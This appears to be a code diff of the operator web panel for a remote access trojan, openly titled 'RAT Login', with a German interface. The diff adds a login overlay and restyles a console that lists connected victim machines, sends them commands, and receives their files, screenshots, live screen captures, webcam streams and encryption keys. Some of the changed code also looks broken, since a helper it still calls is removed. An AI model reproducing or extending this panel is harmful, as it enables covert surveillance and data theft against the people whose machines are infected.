@@ -7,16 +7,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     :root {
-      --bg: #232526;
-      --bg-panel: #23272f;
-      --text: #e0e0e0;
-      --accent: #8ecae6;
+      --bg: #181c24;
+      --bg-panel: #23283b;
+      --text: #e6e9ef;
+      --accent: #5bc0be;
       --accent2: #43d17a;
       --danger: #f44336;
-      --shadow: 0 8px 32px 0 rgba(31,38,135,0.25);
+      --shadow: 0 8px 32px 0 rgba(31,38,135,0.18);
       --border: #2c2f36;
       --panel-radius: 18px;
       --transition: 0.18s;
+      --input-bg: #23283b;
+      --input-border: #3a506b;
+      --input-focus: #5bc0be;
+      --input-radius: 9px;
     }
     html, body {
       height: 100%;
@@ -33,7 +37,7 @@
       height: 100vh;
       margin: 0;
       padding: 0;
-      background: linear-gradient(135deg, var(--bg) 0%, #414345 100%);
+      background: linear-gradient(135deg, var(--bg) 0%, #23283b 100%);
       color: var(--text);
       font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
       display: flex;
@@ -121,7 +125,7 @@
       position: relative;
     }
     #client-list li.selected, #client-list li:hover {
-      background: #2b3140;
+      background: #26324a;
       border-color: var(--accent);
     }
     .client-status-dot {
@@ -143,7 +147,7 @@
       position: absolute;
       left: 110%;
       top: 0;
-      background: #23272a;
+      background: #23283b;
       color: #fff;
       border-radius: 7px;
       padding: 8px 14px;
@@ -159,10 +163,10 @@
     }
     #output {
       flex-grow: 1;
-      background: #181a20;
+      background: #181c24;
       border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 12px;
+      border-radius: 12px;
+      padding: 16px;
       font-family: "Fira Mono", "Consolas", "Courier New", monospace;
       white-space: pre-wrap;
       word-break: break-word;
@@ -170,8 +174,9 @@
       margin-bottom: 14px;
       min-height: 120px;
       max-height: 260px;
-      font-size: 1.01em;
+      font-size: 1.07em;
       position: relative;
+      box-shadow: 0 2px 12px #0002;
     }
     #copy-output {
       position: absolute;
@@ -180,12 +185,13 @@
       background: var(--accent);
       color: #fff;
       border: none;
-      border-radius: 5px;
-      padding: 4px 10px;
-      font-size: 0.95em;
+      border-radius: 7px;
+      padding: 6px 14px;
+      font-size: 1em;
       cursor: pointer;
       opacity: 0.7;
       transition: opacity 0.15s;
+      box-shadow: 0 2px 8px #0003;
     }
     #copy-output:hover { opacity: 1; }
     #controls {
@@ -194,31 +200,38 @@
       flex-wrap: wrap;
       margin-bottom: 10px;
       align-items: center;
+      background: #23283b;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px #0002;
+      padding: 14px 16px 12px 16px;
+      border: 1px solid var(--border);
     }
     #send-button {
-      background: linear-gradient(90deg, #3a506b 0%, #5bc0be 100%);
+      background: linear-gradient(90deg, #5bc0be 0%, #43d17a 100%);
       color: #fff;
       border: none;
-      padding: 9px 16px;
-      border-radius: 7px;
-      font-size: 1em;
-      font-weight: 500;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-size: 1.08em;
+      font-weight: 600;
       cursor: pointer;
       margin-left: 8px;
       box-shadow: 0 2px 8px #0002;
-      transition: background var(--transition), box-shadow var(--transition);
+      transition: background var(--transition), box-shadow var(--transition), transform 0.1s;
+      letter-spacing: 0.03em;
     }
     #send-button:hover {
-      background: linear-gradient(90deg, #5bc0be 0%, #3a506b 100%);
+      background: linear-gradient(90deg, #43d17a 0%, #5bc0be 100%);
       box-shadow: 0 4px 16px #0003;
+      transform: translateY(-2px) scale(1.04);
     }
     input[type="text"] {
       flex-grow: 1;
-      background: var(--bg-panel);
-      border: 1px solid var(--border);
+      background: var(--input-bg);
+      border: 1.5px solid var(--input-border);
       color: var(--text);
-      padding: 11px;
-      border-radius: 7px;
+      padding: 13px;
+      border-radius: var(--input-radius);
       font-size: 1.08em;
       font-family: "Fira Mono", "Consolas", "Courier New", monospace;
       box-shadow: 0 2px 8px #0002;
@@ -227,15 +240,15 @@
       margin-bottom: 0;
     }
     input[type="text"]:focus {
-      border: 1.5px solid var(--accent);
+      border: 2px solid var(--input-focus);
       box-shadow: 0 4px 16px #0003;
-      background: #23272f;
+      background: #23283b;
     }
     #command-suggest {
       font-family: "Fira Mono", "Consolas", "Courier New", monospace;
-      background: #181a20;
+      background: #181c24;
       border: 1px solid var(--border);
-      border-radius: 8px;
+      border-radius: 10px;
       margin-top: 2px;
       box-shadow: 0 4px 16px #000a;
       color: #fff;
@@ -246,14 +259,14 @@
     #command-suggest .suggest-item {
       padding: 8px 16px;
       cursor: pointer;
-      border-radius: 6px;
+      border-radius: 7px;
       transition: background 0.12s;
       display: flex;
       align-items: center;
     }
     #command-suggest .suggest-item.selected,
     #command-suggest .suggest-item:hover {
-      background: #5865f2;
+      background: #5bc0be;
       color: #fff;
     }
     #command-suggest .suggest-desc {
@@ -290,11 +303,11 @@
       left: 0;
       width: 100vw;
       max-height: 30vh;
-      background: #181a20f0;
+      background: #181c24f0;
       color: #fff;
       font-family: "Fira Mono", monospace;
       font-size: 0.98em;
-      border-top: 2px solid #8ecae6;
+      border-top: 2px solid #5bc0be;
       z-index: 9999;
       overflow-y: auto;
       padding: 10px 18px 10px 18px;
@@ -305,13 +318,13 @@
       position: fixed;
       bottom: 32px;
       right: 32px;
-      background: #23272f;
-      color: #8ecae6;
-      border: 2px solid #8ecae6;
+      background: #23283b;
+      color: #5bc0be;
+      border: 2px solid #5bc0be;
       border-radius: 50%;
-      width: 44px;
-      height: 44px;
-      font-size: 1.5em;
+      width: 48px;
+      height: 48px;
+      font-size: 1.6em;
       cursor: pointer;
       z-index: 10000;
       box-shadow: 0 2px 12px #0005;
@@ -321,8 +334,8 @@
       transition: background 0.18s, color 0.18s;
     }
     #debug-toggle:hover {
-      background: #8ecae6;
-      color: #23272f;
+      background: #5bc0be;
+      color: #23283b;
     }
     .debug-log-entry {
       margin-bottom: 2px;
@@ -346,9 +359,9 @@
       position: absolute;
       left: 0;
       top: calc(100% + 4px); /* Abstand unter das Eingabefeld */
-      background: #23272a;
+      background: #23283b;
       color: #fff;
-      border-radius: 6px;
+      border-radius: 7px;
       box-shadow: 0 4px 16px #000a;
       min-width: 220px;
       max-width: 350px;
@@ -368,7 +381,7 @@
     }
     #command-suggest .suggest-item.selected,
     #command-suggest .suggest-item:hover {
-      background: #5865f2;
+      background: #5bc0be;
       color: #fff;
     }
     #command-suggest .suggest-desc {
@@ -377,10 +390,111 @@
       margin-left: 10px;
       flex: 1;
     }
+
+    /* --- Login Overlay --- */
+    #login-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(24,28,36,0.97);
+      z-index: 10001;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.2s;
+    }
+    #login-box {
+      background: #23283b;
+      border-radius: 18px;
+      box-shadow: 0 8px 32px 0 rgba(31,38,135,0.22);
+      padding: 38px 38px 30px 38px;
+      min-width: 340px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+      border: 1.5px solid #5bc0be;
+      animation: fadeIn 0.5s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.97);}
+      to { opacity: 1; transform: scale(1);}
+    }
+    #login-box h1 {
+      color: #5bc0be;
+      font-size: 2em;
+      margin: 0 0 10px 0;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+    }
+    #login-box label {
+      color: #b9bbbe;
+      font-size: 1.08em;
+      margin-bottom: 4px;
+      align-self: flex-start;
+    }
+    #login-box input[type="text"],
+    #login-box input[type="password"] {
+      width: 100%;
+      padding: 13px 12px;
+      border-radius: 9px;
+      border: 1.5px solid #3a506b;
+      background: #181c24;
+      color: #e6e9ef;
+      font-size: 1.08em;
+      margin-bottom: 8px;
+      outline: none;
+      transition: border 0.15s, box-shadow 0.15s;
+      box-shadow: 0 2px 8px #0002;
+    }
+    #login-box input[type="text"]:focus,
+    #login-box input[type="password"]:focus {
+      border: 2px solid #5bc0be;
+      box-shadow: 0 4px 16px #0003;
+      background: #23283b;
+    }
+    #login-box button {
+      width: 100%;
+      padding: 13px 0;
+      background: linear-gradient(90deg, #5bc0be 0%, #43d17a 100%);
+      color: #fff;
+      border: none;
+      border-radius: 9px;
+      font-size: 1.13em;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      box-shadow: 0 2px 8px #0003;
+      transition: background 0.18s, box-shadow 0.18s, transform 0.1s;
+      letter-spacing: 0.03em;
+    }
+    #login-box button:hover {
+      background: linear-gradient(90deg, #43d17a 0%, #5bc0be 100%);
+      box-shadow: 0 4px 16px #0003;
+      transform: translateY(-2px) scale(1.04);
+    }
+    #login-error {
+      color: #f44336;
+      font-size: 1.02em;
+      margin-top: 2px;
+      text-align: center;
+      min-height: 22px;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div id="login-overlay">
+    <form id="login-box" autocomplete="off">
+      <h1>RAT Login</h1>
+      <label for="login-user">Benutzername</label>
+      <input type="text" id="login-user" name="username" autocomplete="username" required autofocus />
+      <label for="login-pass">Passwort</label>
+      <input type="password" id="login-pass" name="password" autocomplete="current-password" required />
+      <div id="login-error"></div>
+      <button type="submit">Anmelden</button>
+    </form>
+  </div>
+  <div class="container" style="display:none;" id="main-app">
     <div id="client-panel" class="panel">
       <h2>Clients</h2>
       <ul id="client-list"></ul>
@@ -406,8 +520,74 @@
       </div>
     </div>
   </div>
-  <button id="debug-toggle" title="Debug anzeigen/verstecken">🐞</button>
+  <button id="debug-toggle" title="Debug anzeigen/verstecken" style="display:none;">🐞</button>
   <div id="debug-panel"></div>
+  <script>
+    // --- Login Overlay ---
+    const loginOverlay = document.getElementById('login-overlay');
+    const loginBox = document.getElementById('login-box');
+    const loginError = document.getElementById('login-error');
+    const mainApp = document.getElementById('main-app');
+
+    function showApp() {
+      loginOverlay.style.display = "none";
+      mainApp.style.display = "";
+      document.getElementById('debug-toggle').style.display = "";
+    }
+
+    function setLoginError(msg) {
+      loginError.textContent = msg || "";
+    }
+
+    async function doLogin(username, password) {
+      try {
+        const resp = await fetch("/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, password }),
+        });
+        if (!resp.ok) {
+          const data = await resp.json();
+          throw new Error(data.error || "Login fehlgeschlagen");
+        }
+        const data = await resp.json();
+        if (data.token) {
+          localStorage.setItem("rat_login", JSON.stringify({ username, token: data.token }));
+          return data.token;
+        }
+        throw new Error("Login fehlgeschlagen");
+      } catch (e) {
+        throw e;
+      }
+    }
+
+    loginBox.onsubmit = async function(e) {
+      e.preventDefault();
+      setLoginError("");
+      const username = document.getElementById('login-user').value;
+      const password = document.getElementById('login-pass').value;
+      try {
+        const token = await doLogin(username, password);
+        showApp();
+        window._rat_token = token;
+        window.initRatApp && window.initRatApp(token);
+      } catch (err) {
+        setLoginError(err.message || "Login fehlgeschlagen. Bitte überprüfe Benutzername und Passwort.");
+      }
+    };
+
+    // --- Auto-Login, wenn Token vorhanden ---
+    window.addEventListener("DOMContentLoaded", () => {
+      try {
+        const login = JSON.parse(localStorage.getItem("rat_login") || "{}");
+        if (login && login.token) {
+          showApp();
+          window._rat_token = login.token;
+          window.initRatApp && window.initRatApp(login.token);
+        }
+      } catch {}
+    });
+  </script>
   <script>
     // --- Globale Variablen für Client-Auswahl ---
     let selectedClientId = null;
@@ -479,6 +659,13 @@
     }
     function renderClientList(clients) {
       clientList.innerHTML = "";
+      if (!clients.length) {
+        const li = document.createElement("li");
+        li.textContent = "Keine Clients verbunden.";
+        li.style.color = "#b9bbbe";
+        clientList.appendChild(li);
+        return;
+      }
       clients.forEach((client) => {
         const li = createClientListItem(client);
         clientList.appendChild(li);
@@ -559,7 +746,16 @@
     });
 
     // --- Upload-Dialog: /upload [Zielpfad] ---
-    // (Entfernt, da chunked upload unten behandelt wird)
+    function showUploadInput(show) {
+      uploadInput.style.display = show ? "inline-block" : "none";
+    }
+    commandInput.addEventListener("input", function () {
+      const val = commandInput.value.trim();
+      showUploadInput(val.startsWith("/upload"));
+    });
+
+    // Initial verstecken
+    showUploadInput(false);
 
     // --- Chunked Upload für große Dateien ---
     const CHUNK_SIZE = 512 * 1024; // 512 KB pro Chunk
@@ -931,158 +1127,152 @@
     }
 
     // --- WebSocket Initialisierung ---
-    const ws = new WebSocket(
-      (location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws"
-    );
+    window.initRatApp = function(token) {
+      // WebSocket mit Token als Query-Parameter
+      const ws = new WebSocket(
+        (location.protocol === "https:" ? "wss://" : "ws://") +
+        location.host +
+        "/ws?token=" + encodeURIComponent(token || window._rat_token || "")
+      );
+      window.ws = ws;
 
-    // --- Webcam-Frame Empfang ---
-    function webcamFrameHandler(event) {
-      // 1. Meta-Frame (action: webcam_frame)
-      let meta;
-      try {
-        meta = JSON.parse(event.data);
-      } catch {
-        return;
+      // --- Webcam-Frame Empfang ---
+      function webcamFrameHandler(event) {
+        // 1. Meta-Frame (action: webcam_frame)
+        let meta;
+        try {
+          meta = JSON.parse(event.data);
+        } catch {
+          return;
+        }
+        if (meta.action === "webcam_frame") {
+          ensureWebcamArea();
+          if (webcamArea) webcamArea.style.display = "";
+          // 2. Nächstes Frame ist das Bild (base64)
+          ws.onmessage = function (event2) {
+            // Fix: Prüfe, ob das Frame base64 ist, sonst als Binärdaten behandeln
+            let b64 = null;
+            // Server sendet als {action: "webcam_frame", img_base64: ...}
+            try {
+              const d = JSON.parse(event2.data);
+              if (d.action === "webcam_frame" && d.img_base64) {
+                b64 = d.img_base64;
+              }
+            } catch {
+              if (typeof event2.data === "string" && event2.data.length > 100) {
+                b64 = event2.data;
+              }
+            }
+            if (b64) {
+              const img = new window.Image();
+              img.onload = function () {
+                webcamCanvas.width = img.width;
+                webcamCanvas.height = img.height;
+                const ctx = webcamCanvas.getContext("2d");
+                ctx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
+                ctx.drawImage(img, 0, 0, img.width, img.height);
+              };
+              img.src = "data:image/jpeg;base64," + b64;
+              if (webcamStatus) webcamStatus.textContent = "Live-Webcam";
+              ws.onmessage = wsMessageHandler;
+            }
+          };
+        } else {
+          wsMessageHandler(event);
+        }
       }
-      if (meta.action === "webcam_frame") {
-        ensureWebcamArea();
-        if (webcamArea) webcamArea.style.display = "";
-        // 2. Nächstes Frame ist das Bild (base64)
-        ws.onmessage = function (event2) {
-          // Fix: Prüfe, ob das Frame base64 ist, sonst als Binärdaten behandeln
-          let b64 = null;
-          // Server sendet als {action: "webcam_frame", img_base64: ...}
-          try {
-            const d = JSON.parse(event2.data);
-            if (d.action === "webcam_frame" && d.img_base64) {
-              b64 = d.img_base64;
-            }
-          } catch {
-            if (typeof event2.data === "string" && event2.data.length > 100) {
-              b64 = event2.data;
-            }
-          }
-          if (b64) {
+
+      ws.onopen = () => {
+        log("WebSocket verbunden.", "info");
+        debugLog("WebSocket verbunden", "info");
+      };
+
+      ws.onclose = () => {
+        log("WebSocket getrennt.", "error");
+        debugLog("WebSocket getrennt", "warn");
+      };
+
+      ws.onerror = (e) => {
+        log("WebSocket Fehler.", "error");
+        debugLog("WebSocket Fehler: " + e, "error");
+      };
+
+      wsMessageHandler = function(event) {
+        let data;
+        try {
+          data = JSON.parse(event.data);
+        } catch (e) {
+          debugLog("Fehler beim Parsen der Nachricht: " + e, "error");
+          return;
+        }
+        if (data.type === "client_list") {
+          renderClientList(data.clients || []);
+        } else if (data.type === "client_connected" || data.type === "client_disconnected") {
+          ws.send(JSON.stringify({ action: "get_clients" }));
+        } else if (data.type === "command_output") {
+          log(data.output || "Kein Output.", "info");
+        } else if (data.type === "file_download") {
+          const blob = b64toBlob(data.data, "application/octet-stream");
+          const a = document.createElement("a");
+          a.href = URL.createObjectURL(blob);
+          a.download = data.filename || "download.bin";
+          a.click();
+          log("Datei-Download gestartet: " + (data.filename || ""), "info");
+        } else if (data.type === "screenshot") {
+          const img = document.createElement("img");
+          img.src = "data:image/png;base64," + data.data;
+          img.style.maxWidth = "100%";
+          output.appendChild(img);
+          log("Screenshot empfangen.", "info");
+        } else if (data.action === "screen_frame") {
+          if (liveScreenArea) liveScreenArea.style.display = "";
+          if (screenCanvas) {
+            const ctx = screenCanvas.getContext("2d");
             const img = new window.Image();
             img.onload = function () {
-              webcamCanvas.width = img.width;
-              webcamCanvas.height = img.height;
-              const ctx = webcamCanvas.getContext("2d");
-              ctx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
-              ctx.drawImage(img, 0, 0, img.width, img.height);
+              screenCanvas.width = data.width;
+              screenCanvas.height = data.height;
+              ctx.clearRect(0, 0, screenCanvas.width, screenCanvas.height);
+              ctx.drawImage(img, 0, 0, data.width, data.height);
             };
-            img.src = "data:image/jpeg;base64," + b64;
-            if (webcamStatus) webcamStatus.textContent = "Live-Webcam";
-            ws.onmessage = wsMessageHandler;
+            img.src = "data:image/jpeg;base64," + data.img_bytes;
           }
-        };
-      } else {
-        wsMessageHandler(event);
-      }
-    }
-
-    ws.onopen = () => {
-      log("WebSocket verbunden.", "info");
-      debugLog("WebSocket verbunden", "info");
-    };
-
-    ws.onclose = () => {
-      log("WebSocket getrennt.", "error");
-      debugLog("WebSocket getrennt", "warn");
-    };
-
-    ws.onerror = (e) => {
-      log("WebSocket Fehler.", "error");
-      debugLog("WebSocket Fehler: " + e, "error");
-    };
-
-    wsMessageHandler = function(event) {
-      let data;
-      try {
-        data = JSON.parse(event.data);
-      } catch (e) {
-        debugLog("Fehler beim Parsen der Nachricht: " + e, "error");
-        return;
-      }
-      if (data.type === "client_list") {
-        renderClientList(data.clients || []);
-      } else if (data.type === "client_connected" || data.type === "client_disconnected") {
-        ws.send(JSON.stringify({ action: "get_clients" }));
-      } else if (data.type === "command_output") {
-        log(data.output || "Kein Output.", "info");
-      } else if (data.type === "file_download") {
-        const blob = b64toBlob(data.data, "application/octet-stream");
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = data.filename || "download.bin";
-        a.click();
-        log("Datei-Download gestartet: " + (data.filename || ""), "info");
-      } else if (data.type === "screenshot") {
-        const img = document.createElement("img");
-        img.src = "data:image/png;base64," + data.data;
-        img.style.maxWidth = "100%";
-        output.appendChild(img);
-        log("Screenshot empfangen.", "info");
-      } else if (data.action === "screen_frame") {
-        if (liveScreenArea) liveScreenArea.style.display = "";
-        if (screenCanvas) {
-          const ctx = screenCanvas.getContext("2d");
-          const img = new window.Image();
-          img.onload = function () {
-            screenCanvas.width = data.width;
-            screenCanvas.height = data.height;
-            ctx.clearRect(0, 0, screenCanvas.width, screenCanvas.height);
-            ctx.drawImage(img, 0, 0, data.width, data.height);
-          };
-          img.src = "data:image/jpeg;base64," + data.img_bytes;
+          if (screenStatus) screenStatus.textContent = "Live-Bild";
+        } else if (data.action === "webcam_frame") {
+          // Spezialbehandlung: Webcam-Stream
+          webcamFrameHandler(event);
+          return;
+        } else if (data.type === "encryption_key") {
+          log("Verschlüsselungs-Schlüssel empfangen: " + data.key_hex, "info");
+        } else if (data.type === "error") {
+          log(data.message || data.error || "Fehler", "error");
+        } else if (data.type === "debug") {
+          debugLog(data.msg, data.level || "info");
+        } else if (data.type === "client_log") {
+          log("[Client] " + (data.msg || ""), data.level || "info");
+          debugLog("[Client] " + (data.msg || ""), data.level || "info");
+        } else if (data.type === "webcam_image") {
+          const img = document.createElement("img");
+          img.src = "data:image/png;base64," + data.data;
+          img.style.maxWidth = "100%";
+          output.appendChild(img);
+          log("Webcam-Bild empfangen.", "info");
         }
-        if (screenStatus) screenStatus.textContent = "Live-Bild";
-      } else if (data.action === "webcam_frame") {
-        // Spezialbehandlung: Webcam-Stream
-        webcamFrameHandler(event);
-        return;
-      } else if (data.type === "encryption_key") {
-        log("Verschlüsselungs-Schlüssel empfangen: " + data.key_hex, "info");
-      } else if (data.type === "error") {
-        log(data.message || data.error || "Fehler", "error");
-      } else if (data.type === "debug") {
-        debugLog(data.msg, data.level || "info");
-      } else if (data.type === "client_log") {
-        log("[Client] " + (data.msg || ""), data.level || "info");
-        debugLog("[Client] " + (data.msg || ""), data.level || "info");
-      } else if (data.type === "webcam_image") {
-        const img = document.createElement("img");
-        img.src = "data:image/png;base64," + data.data;
-        img.style.maxWidth = "100%";
-        output.appendChild(img);
-        log("Webcam-Bild empfangen.", "info");
-      }
+      };
+
+      // --- Senden-Button ---
+      sendButton.onclick = () => sendCommand();
+      commandInput.addEventListener("keydown", (e) => {
+        if (e.key === "Enter" && !e.shiftKey) {
+          sendCommand();
+        }
+      });
     };
 
-    // --- Hilfsfunktion: base64 zu Blob ---
-    function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
-      const byteCharacters = atob(b64Data);
-      const byteArrays = [];
-      for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
-        const slice = byteCharacters.slice(offset, offset + sliceSize);
-        const byteNumbers = new Array(slice.length);
-        for (let i = 0; i < slice.length; i++) {
-          byteNumbers[i] = slice.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        byteArrays.push(byteArray);
-      }
-      return new Blob(byteArrays, { type: contentType });
+    // Starte App, falls Token schon da (Auto-Login)
+    if (window._rat_token) {
+      window.initRatApp(window._rat_token);
     }
-
-    ws.onmessage = wsMessageHandler;
-    // --- Senden-Button ---
-    sendButton.onclick = () => sendCommand();
-    commandInput.addEventListener("keydown", (e) => {
-      if (e.key === "Enter" && !e.shiftKey) {
-        sendCommand();
-      }
-    });
   </script>
 </body>
 </html>
